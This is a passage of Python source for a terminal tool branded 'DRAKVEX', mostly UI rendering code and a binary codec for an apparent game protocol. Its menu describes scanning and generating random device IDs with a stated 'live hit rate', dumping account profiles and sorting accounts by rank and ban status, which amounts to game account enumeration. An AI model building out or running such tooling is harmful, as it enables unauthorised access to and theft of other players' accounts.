import os
import sys
import re
import time
import json
import shutil
import socket
import struct
import zlib
import random
import threading
import datetime
from enum import Enum
from typing import Any, Tuple
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

import zstandard as zstd
import urllib3
from Crypto.Cipher import AES
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# [DRAKVEX_TUNE2]
_TLS = threading.local()


def _zc():
    c = getattr(_TLS, 'zc', None)
    if c is None:
        c = zstd.ZstdCompressor(level=1)
        _TLS.zc = c
    return c


def _zd():
    d = getattr(_TLS, 'zd', None)
    if d is None:
        d = zstd.ZstdDecompressor()
        _TLS.zd = d
    return d


_CY  = Fore.CYAN    + Style.BRIGHT
_GN  = Fore.GREEN   + Style.BRIGHT
_RD  = Fore.RED     + Style.BRIGHT
_YL  = Fore.YELLOW  + Style.BRIGHT
_MG  = Fore.MAGENTA + Style.BRIGHT
_WH  = Fore.WHITE   + Style.BRIGHT
_BLU = Fore.BLUE    + Style.BRIGHT
_DIM = Style.DIM
_RST = Style.RESET_ALL
_BRT = Style.BRIGHT

PALETTES = {
    "aurora":  ["#00f5ff", "#5b8cff", "#a855f7", "#ff4fd8"],
    "sunset":  ["#ff4fd8", "#ff8a5b", "#ffd15b"],
    "neon":    ["#00ffa3", "#00d4ff", "#7b5bff"],
    "ember":   ["#ff4b4b", "#ff8a3d", "#ffce54"],
    "ice":     ["#b6f6ff", "#6cd9ff", "#2a7fff"],
    "mono":    ["#e0e0e0", "#a0a0a0", "#606060"],
    "blood":   ["#7a0000", "#c81414", "#ff3b3b"],
    "drakvex": ["#3a0000", "#7a0000", "#c81414", "#ff3b3b", "#ff6b2b", "#ffe0b2"],
    "void":    ["#1a0000", "#3a0000", "#5a0a0a", "#7a0000"],
}

BRAND = {
    "bg":    "#0a0000",
    "void":  "#1a0000",
    "blood": "#7a0000",
    "ember": "#c81414",
    "flare": "#ff3b3b",
    "bone":  "#ffe0b2",
}

TOKENS = {
    "SUCCESS": "\x1b[38;5;114m\x1b[1m",
    "DANGER":  "\x1b[38;5;196m\x1b[1m",
    "WARN":    "\x1b[38;5;214m\x1b[1m",
    "MUTED":   "\x1b[2m",
    "BRAND":   "\x1b[38;5;160m\x1b[1m",
    "ACCENT":  "\x1b[38;5;209m\x1b[1m",
    "BONE":    "\x1b[38;5;230m\x1b[1m",
}

RANK_CHIPS = {
    "Warrior":           ("#8a5a3a", "#c98a5a"),
    "Elite":             ("#5a6a8a", "#8aa0c8"),
    "Master":            ("#4a5a7a", "#7a94c4"),
    "Grandmaster":       ("#3a4a6a", "#6a84b4"),
    "Epic":              ("#5a3a7a", "#9a6ac4"),
    "Legend":            ("#3a5a7a", "#5a9ac4"),
    "Mythic":            ("#7a3a4a", "#c46a84"),
    "Mythical Honor":    ("#8a3a3a", "#d45a5a"),
    "Mythical Glory":    ("#a02020", "#ff4040"),
    "Mythical Immortal": ("#c81414", "#ff6b2b"),
}

BAN_CHIPS = {
    "21": ("#a02020", "#ff4040"),
    "22": ("#8a4a20", "#ff8a3d"),
    "23": ("#7a5a00", "#ffce54"),
    "24": ("#a02020", "#ff3b3b"),
    "25": ("#6a2060", "#c46ad4"),
    "26": ("#5a3a20", "#a08060"),
}

_TRUE_COLOR = os.environ.get("COLORTERM", "").lower() in ("truecolor", "24bit")
_NERD = os.environ.get("DRAKVEX_NERD", "") == "1"
_BRACKETS = os.environ.get("DRAKVEX_BRACKETS", "square").lower()
_NUMSTYLE = os.environ.get("DRAKVEX_NUM", "commas").lower()

if _BRACKETS == "angle":
    BR_OPEN, BR_CLOSE = "\u27e8", "\u27e9"
elif _BRACKETS == "pipe":
    BR_OPEN, BR_CLOSE = "|", "|"
else:
    BR_OPEN, BR_CLOSE = "[", "]"

if _NERD:
    G_ACCOUNT = "\uf007"
    G_RANK    = "\uf11b"
    G_SKIN    = "\uf005"
    G_BAN     = "\uf05e"
    G_BATTLES = "\uf0c9"
    G_COLL    = "\uf219"
    G_STATUS  = "\uf017"
    G_SOCIAL  = "\uf0c0"
    G_HISTORY = "\uf1da"
    G_MATCH   = "\uf091"
    G_EXTRA   = "\uf067"
    G_LIVE    = "\uf111"
else:
    G_ACCOUNT = "\u2691"
    G_RANK    = "\u2694"
    G_SKIN    = "\u2605"
    G_BAN     = "\u2691"
    G_BATTLES = "\u2630"
    G_COLL    = "\u25c8"
    G_STATUS  = "\u29d7"
    G_SOCIAL  = "\u25c8"
    G_HISTORY = "\u2694"
    G_MATCH   = "\u2726"
    G_EXTRA   = "\u25b8"
    G_LIVE    = "\u259b"


def fmt_num(n):
    try:
        v = int(n)
    except (TypeError, ValueError):
        return str(n)
    if _NUMSTYLE == "short":
        if abs(v) >= 1_000_000:
            return f"{v / 1_000_000:.1f}M"
        if abs(v) >= 1_000:
            return f"{v / 1_000:.1f}k"
    return f"{v:,}"


_ANSI = re.compile(r'\x1b\[[0-9;?]*[A-Za-z]')


def vlen(s):
    return len(_ANSI.sub('', str(s)))


def tw():
    return shutil.get_terminal_size((100, 30)).columns


def w(n=80):
    return min(tw() - 4, n)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def clear_line():
    sys.stdout.write('\r\x1b[K')
    sys.stdout.flush()


def pad_right(s, width, fill=' '):
    d = width - vlen(s)
    return str(s) + (fill * d if d > 0 else '')


def pad_left(s, width, fill=' '):
    d = width - vlen(s)
    return (fill * d if d > 0 else '') + str(s)


def trunc(s, width, suffix='..'):
    s = str(s)
    if vlen(s) <= width:
        return s
    if width <= vlen(suffix):
        return suffix[:width]
    keep = width - vlen(suffix)
    out = ''
    for ch in s:
        if vlen(out + ch) > keep:
            break
        out += ch
    return out + suffix


def stamp(fmt='%H:%M:%S'):
    return datetime.datetime.now().strftime(fmt)


def commas(n):
    return fmt_num(n)


def _commas_orig(n):
    try:
        return f'{int(n):,}'
    except Exception:
        return str(n)


def human_dur(sec):
    sec = float(max(0, sec))
    if sec < 1:
        return f'{int(sec * 1000)}ms'
    if sec < 60:
        return f'{sec:.1f}s'
    m, s = divmod(int(sec), 60)
    if m < 60:
        return f'{m}m{s:02d}s'
    h, rem = divmod(m, 60)
    return f'{h}h{rem:02d}m'


def human_bytes(n, prec=1):
    n = float(n)
    for unit in ('B', 'KB', 'MB', 'GB', 'TB'):
        if abs(n) < 1024.0:
            return f'{int(n)} {unit}' if unit == 'B' else f'{n:.{prec}f} {unit}'
        n /= 1024.0
    return f'{n:.{prec}f} PB'


def fv(val, fallback='-'):
    if val is None:
        return fallback
    if isinstance(val, str):
        return val if val.strip() and val.strip().upper() != 'N/A' else fallback
    return val


def as_int(v, default=0):
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def _hex(h):
    h = h.lstrip('#')
    if len(h) == 3:
        h = ''.join(c * 2 for c in h)
    return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))


def _to_hex(rgb):
    r, g, b = (max(0, min(255, int(x))) for x in rgb)
    return f'#{r:02x}{g:02x}{b:02x}'


def _lerp(a, b, t):
    return a + (b - a) * t


def ramp(stops, n):
    if n <= 0:
        return []
    if n == 1:
        return [stops[0]]
    cols = [_hex(s) for s in stops]
    segs = len(cols) - 1
    out = []
    for i in range(n):
        t = i / (n - 1)
        seg = min(int(t * segs), segs - 1)
        lt = t * segs - seg
        c1, c2 = cols[seg], cols[seg + 1]
        out.append(_to_hex(tuple(_lerp(c1[k], c2[k], lt) for k in range(3))))
    return out


def palette(name):
    return PALETTES.get(name, PALETTES['aurora'])


def hex_ansi(h):
    r, g, b = _hex(h)
    if _TRUE_COLOR:
        return f"\x1b[38;2;{r};{g};{b}m"
    rr = round(r / 255 * 5)
    gg = round(g / 255 * 5)
    bb = round(b / 255 * 5)
    return f"\x1b[38;5;{16 + 36 * rr + 6 * gg + bb}m"


def rank_chip(rank_name):
    for k, (lo, hi) in RANK_CHIPS.items():
        if rank_name and rank_name.startswith(k):
            return f"{hex_ansi(hi)}{rank_name}{_RST}"
    return f"{_DIM}{rank_name or '?'}{_RST}"


def ban_chip(code, text):
    lo, hi = BAN_CHIPS.get(str(code or ""), ("#4a4a4a", "#a0a0a0"))
    return f"{hex_ansi(hi)}{text}{_RST}"


def unit_split(num_str, unit):
    return f"{_WH}{num_str}{_RST} {_DIM}{unit}{_RST}"


def bracket(text, color=None):
    c = color or _CY
    return f"{c}{BR_OPEN}{_RST}{text}{c}{BR_CLOSE}{_RST}"


def grad_bar(filled, total, pal='aurora', empty='\u2591'):
    filled = max(0, min(filled, total))
    if filled == 0:
        return _DIM + empty * total + _RST
    colors = ramp(palette(pal), filled)
    out = ''.join(hex_ansi(c) + '\u2588' for c in colors)
    out += _RST
    if filled < total:
        out += _DIM + empty * (total - filled) + _RST
    return out


def grad_text(text, pal='aurora'):
    vis = [c for c in text if c != ' ']
    colors = ramp(palette(pal), max(len(vis), 1))
    out = ''
    i = 0
    for ch in text:
        if ch == ' ':
            out += ch
            continue
        out += hex_ansi(colors[i]) + ch
        i += 1
    out += _RST
    return out


LOG_LEVELS = {
    'INFO':    (_CY, 'i'),
    'SUCCESS': (_GN, '+'),
    'WARNING': (_YL, '!'),
    'ERROR':   (_RD, 'x'),
    'DEBUG':   (_DIM, '.'),
    'BAN':     (_RD, '!'),
    'CLEAN':   (_GN, '+'),
}


def log(level, msg, indent='  '):
    c, g = LOG_LEVELS.get(level, (_DIM, '.'))
    print(f'{indent}{_DIM}[{stamp()}]{_RST} {c}{g}{_RST}  {msg}')


def bullet(text, color=None, glyph='\u25aa'):
    c = color or _CY
    print(f'  {c}{glyph}{_RST} {text}')


def section(title, color=None):
    c = color or _CY
    width = w()
    used = vlen(title) + 6
    tail = max(0, width - used)
    print()
    print(f'  {c}\u25b8{_RST} {_WH}{_BRT}{title}{_RST}  {c}{"\u2501" * tail}{_RST}')


def divider(color=None):
    c = color or _DIM
    print(f'  {c}{"\u2501" * w()}{_RST}')


def ask(prompt, default=''):
    suffix = f' [{default}]' if default else ''
    try:
        a = input(f'  {prompt}{_DIM}{suffix}{_RST} {_CY}>{_RST} ').strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return a or default


def press_enter(msg='press enter'):
    try:
        input(f'  {_DIM}{msg}...{_RST}')
    except (EOFError, KeyboardInterrupt):
        print()


def _menu_badge(label):
    return None


MENU_GROUPS = [
    ("SCAN",     ["1", "2"]),
    ("DUMP",     ["3", "4"]),
    ("GENERATE", ["5"]),
    ("SYS",      ["6", "0"]),
]

DESTRUCTIVE = {"2"}

MENU_DESCRIPTIONS = {
    "1": "scan ids, drop banned / low / unranked / invalid",
    "2": "sort clean ids into per-rank folders",
    "3": "full profile dump per device id",
    "4": "dedupe device ids from any text files",
    "5": "random ids, ~5-10% live hit rate",
    "6": "where the files land",
    "0": "close",
}

MENU_ALIASES = {
    "trash": "1", "rank": "2", "info": "3",
    "merge": "4", "gen": "5", "paths": "6",
    "exit": "0", "quit": "0", "q": "0",
}

SESSION_HISTORY = []


def _menu_render(options, title, hover=None):
    width = w(80)
    print()
    header = f"{title}"
    print(f"  {_CY}\u25c8{_RST}  {_WH}{_BRT}{header}{_RST}  "
          f"{hex_ansi('#7a0000')}{'\u2501' * max(0, width - vlen(header) - 6)}{_RST}")
    print()

    by_key = {k: (k, label, desc) for k, label, desc in options}
    pal = palette("drakvex")

    for group, keys in MENU_GROUPS:
        keys = [k for k in keys if k in by_key]
        if not keys:
            continue
        gline = f"{_DIM}{group}{_RST}"
        pad = max(0, width - vlen(group) - 4)
        print(f"  {gline}  {hex_ansi('#3a0000')}{'\u2500' * pad}{_RST}")
        for k in keys:
            _, label, desc = by_key[k]
            c = pal[hash(k) % len(pal)]
            key_chip = f"{hex_ansi(c)}{BR_OPEN}{k}{BR_CLOSE}{_RST}"
            badge = _menu_badge(label)
            badge_txt = f"  {_DIM}{badge}{_RST}" if badge else ""
            alias = next((a for a, kk in MENU_ALIASES.items() if kk == k), "")
            alias_txt = f"  {_DIM}({alias}){_RST}" if alias and alias != k else ""
            lbl_color = _YL if k in DESTRUCTIVE and os.path.isdir(RANK_DIR) else _WH
            rail = f"{hex_ansi(c)}\u258c{_RST} " if (hover == k) else "  "
            print(f"  {rail}{key_chip}  {lbl_color}{pad_right(trunc(label, 26), 26)}{_RST}"
                  f"{badge_txt}{alias_txt}")
            if hover == k:
                print(f"      {_DIM}\u2514\u2500 {desc}{_RST}")
        print()

    if SESSION_HISTORY:
        recent = " \u00b7 ".join(SESSION_HISTORY[-5:])
        print(f"  {_DIM}recent: {recent}{_RST}")

    print(f"  {_DIM}alias: trash \u00b7 rank \u00b7 info \u00b7 merge \u00b7 gen \u00b7 paths \u00b7 exit{_RST}")
    print(f"  {_DIM}verbose {'on' if os.environ.get('DRAKVEX_DEBUG') else 'off'} "
          f"\u00b7 type 'v' to toggle{_RST}")


def menu(options, title="SELECT"):
    valid = {k for k, _, _ in options}
    hover = None

    while True:
        _menu_render(options, title, hover=hover)
        try:
            raw = input(f"  {hex_ansi('#c81414')}\u2588{_RST} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return options[-1][0]

        if raw == "v":
            if os.environ.get("DRAKVEX_DEBUG"):
                os.environ.pop("DRAKVEX_DEBUG", None)
            else:
                os.environ["DRAKVEX_DEBUG"] = "1"
            continue

        if raw in valid:
            SESSION_HISTORY.append(raw)
            return raw
        if raw in MENU_ALIASES and MENU_ALIASES[raw] in valid:
            k = MENU_ALIASES[raw]
            SESSION_HISTORY.append(k)
            return k
        for k, label, _ in options:
            if raw and label.lower().startswith(raw):
                SESSION_HISTORY.append(k)
                return k
        print(f"  {_RD}x{_RST}  {_DIM}pick: {', '.join(sorted(valid))}{_RST}")
        time.sleep(0.4)


class Spinner:
    _frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c', '\u2834',
               '\u2826', '\u2827', '\u2807', '\u280f']

    def __init__(self, text='working', color=None, delay=0.08):
        self.text = text
        self.color = color or _CY
        self.delay = delay
        self._stop = threading.Event()
        self._t = None
        self._i = 0

    def _loop(self):
        while not self._stop.is_set():
            f = self._frames[self._i % len(self._frames)]
            sys.stdout.write(f'\r  {self.color}{f}{_RST} {self.text}  ')
            sys.stdout.flush()
            self._i += 1
            time.sleep(self.delay)
        clear_line()

    def start(self):
        self._t = threading.Thread(target=self._loop, daemon=True)
        self._t.start()
        return self

    def stop(self, final=None):
        self._stop.set()
        if self._t:
            self._t.join(timeout=0.5)
        clear_line()
        if final:
            print(f'  {final}')

    def __enter__(self):
        return self.start()

    def __exit__(self, *a):
        self.stop()


class Card:
    STYLES = {
        "sharp":   ("\u2554", "\u2557", "\u255a", "\u255d", "\u2551", "\u2550", "\u2560", "\u2563"),
        "rounded": ("\u256d", "\u256e", "\u2570", "\u256f", "\u2502", "\u2500", "\u251c", "\u2524"),
    }

    CHIP_STYLES = {
        "CLEAN":   ("#0bda51", "\u25cf CLEAN"),
        "BANNED":  ("#ff3b3b", "\u25cf BANNED"),
        "MIXED":   ("#ffce54", "\u25cf MIXED"),
        "UNKNOWN": ("#a0a0a0", "\u25cf UNKNOWN"),
    }

    def __init__(self, title="", width=40, border=None, tcolor=None,
                 style="rounded", rail=None, chip=None):
        self.title = title
        self.width = width
        self.border = border or hex_ansi("#c81414")
        self.tcolor = tcolor or _WH
        self.style = style if style in self.STYLES else "rounded"
        self.rail = rail
        self.chip = chip
        self.body = []
        self.shadow = True

    def _g(self):
        return self.STYLES[self.style]

    def _inner(self):
        return self.width - 2

    def _rail_col(self):
        if not self.rail:
            return ""
        return f"{self.rail}\u258c{_RST}"

    def _chip_render(self):
        if not self.chip:
            return ""
        lo, txt = self.CHIP_STYLES.get(self.chip, ("#a0a0a0", self.chip))
        return f"{hex_ansi(lo)}{_BRT}{txt}{_RST}"

    def _fit(self, content):
        inner = self._inner()
        rail_w = 1 if self.rail else 0
        avail = inner - rail_w - 1
        if vlen(content) > avail:
            content = trunc(content, avail)
        pad = avail - vlen(content)
        tl, tr, bl, br, v, h, ml, mr = self._g()
        if self.rail:
            return f"{self.border}{v}{_RST}{self._rail_col()} {content}{' ' * max(0, pad)}{self.border}{v}{_RST}"
        return f"{self.border}{v}{_RST}{content}{' ' * max(0, pad)}{self.border}{v}{_RST}"

    def _title_row(self):
        inner = self._inner()
        tl, tr, bl, br, v, h, ml, mr = self._g()
        rail_w = 1 if self.rail else 0
        chip = self._chip_render()
        chip_w = vlen(chip) + 1 if chip else 0
        t = self.title
        max_t = inner - rail_w - chip_w - 4
        if len(t) > max_t:
            t = trunc(t, max_t)
        pad = inner - rail_w - chip_w - len(t) - 2
        left = f"{self.border}{v}{_RST}"
        if self.rail:
            left += self._rail_col() + " "
        else:
            left += " "
        body = f"{self.tcolor}{_BRT}{t}{_RST}{' ' * max(0, pad)}"
        if chip:
            body += " " + chip
        else:
            body += " "
        return left + body + f"{self.border}{v}{_RST}"

    def kv(self, key, val, vc=None, kw=15, glyph=None):
        vc = vc or _WH
        g = f"{glyph} " if glyph else ""
        k = f"{_DIM}{g}{pad_right(str(key), kw - len(g))}{_RST}"
        rail_w = 1 if self.rail else 0
        avail = self._inner() - kw - 6 - rail_w
        v = f"{vc}{trunc(str(val), max(4, avail))}{_RST}"
        self.body.append(("line", f" {k}  {v} "))
        return self

    def kv_dim_unit(self, key, num, unit, vc=None, kw=15, glyph=None):
        vc = vc or _WH
        g = f"{glyph} " if glyph else ""
        k = f"{_DIM}{g}{pad_right(str(key), kw - len(g))}{_RST}"
        rail_w = 1 if self.rail else 0
        avail = self._inner() - kw - 6 - rail_w
        combined = f"{vc}{num}{_RST} {_DIM}{unit}{_RST}"
        if vlen(combined) > avail:
            combined = trunc(combined, avail)
        self.body.append(("line", f" {k}  {combined} "))
        return self

    def section(self, label, glyph=None):
        self.body.append(("section", (label, glyph)))
        return self

    def collapse(self, label, count=None, glyph=None):
        c = f"  {_DIM}{count} items{_RST}" if count is not None else ""
        g = f"{glyph} " if glyph else ""
        self.body.append(("collapse", (f"{g}{label}", c)))
        return self

    def sep(self):
        self.body.append(("sep", None))
        return self

    def bar(self, value, maxval, pal="drakvex", label=None):
        self.body.append(("bar", (value, maxval, pal, label)))
        return self

    def delta(self, key, delta, unit="", kw=15):
        sign = "\u25b2" if delta >= 0 else "\u25bc"
        c = _GN if delta >= 0 else _RD
        k = f"{_DIM}{pad_right(str(key), kw)}{_RST}"
        v = f"{c}{sign} {abs(delta):,}{unit}{_RST}"
        self.body.append(("line", f" {k}  {v} "))
        return self

    def render(self):
        tl, tr, bl, br, v, h, ml, mr = self._g()
        inner = self._inner()
        out = [f"{self.border}{tl}{h * inner}{tr}{_RST}"]
        if self.title:
            out.append(self._title_row())
            out.append(f"{self.border}{ml}{h * inner}{mr}{_RST}")
        for kind, payload in self.body:
            if kind == "line":
                out.append(self._fit(payload))
            elif kind == "sep":
                out.append(f"{self.border}{ml}{h * inner}{mr}{_RST}")
            elif kind == "section":
                label, glyph = payload
                g = f"{glyph} " if glyph else ""
                txt = f"  {_CY}{g}{_BRT}{label}{_RST}"
                pad = inner - vlen(txt)
                out.append(self._fit(txt + " " * max(0, pad)))
            elif kind == "collapse":
                label, count = payload
                txt = f"  {_DIM}\u25bc{_RST} {_WH}{label}{_RST}{count}"
                out.append(self._fit(txt))
            elif kind == "bar":
                value, maxval, pal, label = payload
                frac = 0 if not maxval else max(0.0, min(1.0, value / maxval))
                rail_w = 1 if self.rail else 0
                bw = max(6, inner - 14 - rail_w)
                fill = int(frac * bw)
                bar = grad_bar(fill, bw, pal)
                tip = f"{hex_ansi('#ff6b2b')}\u25b6{_RST}" if 0 < fill < bw else ""
                p = f"{frac * 100:5.1f}%"
                lbl = f" {_DIM}{label}{_RST}" if label else ""
                out.append(self._fit(f" {bar}{tip} {_YL}{p}{_RST}{lbl} "))
        out.append(f"{self.border}{bl}{h * inner}{br}{_RST}")
        if self.shadow:
            shadow = f" {hex_ansi('#1a0000')}{'\u2584' * (inner - 1)}{_RST}"
            out.append(shadow)
        out.append(f" {_DIM}\u29d7 @drakvexxx{_RST}")
        return out


def card_width(cols=2, gap=3, indent=4, cap=58):
    raw = (tw() - indent - gap * (cols - 1)) // cols
    return max(30, min(raw, cap))


def card_stack(*cards, per_row=2, gap=3):
    indent = '  '
    for i in range(0, len(cards), per_row):
        row = cards[i:i + per_row]
        rendered = [c.render() for c in row]
        height = max((len(r) for r in rendered), default=0)
        for row_idx in range(height):
            parts = []
            for idx, r in enumerate(rendered):
                if row_idx < len(r):
                    parts.append(r[row_idx])
                else:
                    parts.append(' ' * row[idx].width)
            print(indent + (' ' * gap).join(parts))
        print()


def pair(a, b, gap=3):
    card_stack(a, b, per_row=2, gap=gap)


BANNER_ART = [
    " \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557",
    " \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d",
    " \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557   \u255a\u2588\u2588\u2588\u2588\u2554\u255d ",
    " \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d   \u2588\u2588\u2554\u2588\u2588\u2557 ",
    " \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2557 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2554\u255d \u2588\u2588\u2557",
    " \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d",
]

BANNER_COMPACT = [
    "\u2554\u2566\u2557\u2566\u2550\u2557\u2554\u2550\u2557\u2566\u2554\u2550\u2566  \u2566\u2554\u2550\u2557\u2550\u2557 \u2566",
    " \u2560\u2560\u2566\u255d\u2560\u2550\u2563\u2560\u2569\u2557\u255a\u2557\u2554\u255d\u2560\u2563  \u2554\u2569\u2566\u255d",
    " \u2569\u2569\u255a\u2550\u2569 \u2569\u2569 \u2569 \u255a\u255d \u255a\u2550\u255d\u2569 \u255a\u2550",
]


def _pill(text, color=None):
    c = color or hex_ansi("#c81414")
    inner = len(text) + 4
    return f"{c}\u256d{' ' + text + ' '}\u256e{_RST}"


def _blade(width):
    if width <= 6:
        return "\u2500" * width
    left = max(2, width // 4)
    right = max(2, width // 4)
    mid = width - left - right - 1
    return "\u25ac" * left + "\u257e" + "\u2501" * mid + "\u257e" + "\u25ac" * right


def _corner_marks(width):
    return (f"{hex_ansi('#7a0000')}\u2310{_RST}"
            + " " * max(0, width - 2)
            + f"{hex_ansi('#7a0000')}\u2310{_RST}")


def _scanlines(art, pal="drakvex"):
    out = []
    for i, line in enumerate(art):
        out.append(grad_text(line, pal))
        if i < len(art) - 1:
            out.append(f"{_DIM}{'\u2581' * max(0, vlen(line))}{_RST}")
    return out


def _boot_fade(art, pal="drakvex", frames=5, delay=0.05):
    for step in range(frames + 1):
        t = step / frames
        if step > 0:
            sys.stdout.write(f"\x1b[{len(art)}A")
        for line in art:
            sys.stdout.write("\r\x1b[2K   " + grad_text(line, pal) + "\n")
        sys.stdout.flush()
        time.sleep(delay)


def _boot_ticker(text, color=None, width=60):
    c = color or _CY
    steps = ["\u00b7", "\u2022", "\u25cf"]
    for i, s in enumerate(text.split("\u00b7")):
        sys.stdout.write(f"\r  {c}{s.strip()}{_RST}  ")
        sys.stdout.flush()
        time.sleep(0.06)
    sys.stdout.write("\r\x1b[2K")
    sys.stdout.flush()


def _boot_stamp():
    now = datetime.datetime.now()
    return now.strftime("%H:%M:%S")


def show_banner():
    clear()
    print()
    try:
        cols = tw()
    except Exception:
        cols = 100
    art = BANNER_ART if cols >= 76 else BANNER_COMPACT
    pal = "drakvex"

    print("  " + _corner_marks(min(cols - 2, 74)))
    print()

    try:
        sys.stdout.write("\x1b[?25l")
        for _ in range(2):
            for line in art:
                sys.stdout.write("\r\x1b[2K   " + grad_text(line, pal) + "\n")
            time.sleep(0.08)
            if _ < 1:
                sys.stdout.write(f"\x1b[{len(art)}A")
        sys.stdout.write("\x1b[?25h")
        sys.stdout.flush()
    except Exception:
        for line in art:
            print("   " + grad_text(line, pal))

    print()
    tag = "@drakvexxx"
    print("   " + _pill(tag))
    print()
    width = w()
    try:
        line = _blade(width)
        cols_ramp = ramp(palette(pal), len(line))
        rendered = ""
        for idx, (c, g) in enumerate(zip(cols_ramp, line)):
            rendered += hex_ansi(c) + g
            if idx % 8 == 0:
                sys.stdout.write("  " + rendered + _RST)
                sys.stdout.flush()
                time.sleep(0.015)
                sys.stdout.write("\r")
        print("  " + rendered + _RST)
    except Exception:
        print("  " + "\u2500" * width)
    print()
    try:
        sys.stdout.write("\x1b]0;DRAKVEX // @drakvexxx\x07")
        sys.stdout.flush()
    except Exception:
        pass


class SdpType(Enum):
    INT_POS = 0
    INT_NEG = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8


class SdpError(Exception):
    pass


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items(), key=_sdp_sort_key):
            self._pack(tag, value)
        self.data += bytes([SdpType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpType) and value == SdpType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self):
        if self.offset >= len(self.data):
            raise SdpError('varint eof')
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data):
                raise SdpError('varint truncated')
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, dtype):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpType.INT_POS)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpType.INT_NEG)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpType.INT_POS)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpType.STRUCT_BEGIN)
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(k, v)
                self.data += bytes([SdpType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpError(f'unsupported type {type(value)}')

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            dtype = SdpType(header >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()

            if dtype == SdpType.INT_POS:
                return tag, self._read_number()
            if dtype == SdpType.INT_NEG:
                return tag, -self._read_number()
            if dtype == SdpType.FLOAT:
                raw = self._read_number().to_bytes(4, 'little')
